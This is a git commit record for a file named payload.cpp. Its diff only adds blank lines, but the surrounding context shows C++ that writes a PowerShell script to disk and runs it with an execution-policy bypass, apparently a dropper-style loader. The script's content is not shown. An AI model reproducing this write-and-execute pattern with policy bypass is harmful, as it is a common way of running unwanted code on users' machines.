7aeeea6cd989f4c76dc008ba2f1e436fbc975088
Asko7779 <169293034+Asko7779@users.noreply.github.com>
2025-05-15 22:35:52 +0200

    Update payload.cpp

--- payload.cpp
+++ payload.cpp
@@ -22,7 +22,8 @@ int main() {
         std::cerr << "failed" << std::endl;
         return 1;
     }
-
+
+
     psFile << psScript;
     psFile.close();
     system("powershell -NoProfile -ExecutionPolicy Bypass -File test.ps1");
